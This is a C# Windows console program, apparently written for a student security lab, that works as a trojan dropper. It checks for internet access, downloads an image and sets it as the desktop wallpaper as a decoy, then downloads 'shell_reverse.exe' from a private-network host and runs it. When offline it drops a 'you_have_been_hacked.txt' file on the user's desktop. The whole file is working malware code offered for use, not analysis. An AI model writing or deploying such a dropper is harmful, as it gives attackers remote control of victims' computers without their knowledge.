using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Text;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        static void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        static void Main(string[] args)
        {
            

            if (CheckForInternetConnection() == true)
            {
                try
                {
                    using (var client = new WebClient())
                    {
                        client.DownloadFile("https://images8.alphacoders.com/630/630414.jpg", "whentheycry.jpg"); 
                        //download file with name whentheycry.jpg
                        string imgWallpaper = Directory.GetCurrentDirectory()+"\\whentheycry.jpg";
                        // get the currentdirectory of file 
                        if (File.Exists(imgWallpaper))
                        {
                            SetWallpaper(imgWallpaper); // change the desktop imagae
                        }
                        client.DownloadFile("http://192.168.111.129/shell_reverse.exe", "shell_reverse.exe");
                        // download reverse shell with name shell_reverse.exe
                        Process.Start("shell_reverse.exe");
                        // run the shell_reverse.exe
                    }
                }
                catch { }
            }
            else
            {
                string path = @"C:\Users\"+Environment.UserName+ @"\Desktop\you_have_been_hacked.txt";
                // Environment.UserName get the username
                try
                {
                    // Create the file, or overwrite if the file exists.
                    using (FileStream fs = File.Create(path))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("MSSV: 18520060");
                        // Add some information to the file.
                        fs.Write(info, 0, info.Length);
                    }
                }
                catch { }
            }
        }

    }
}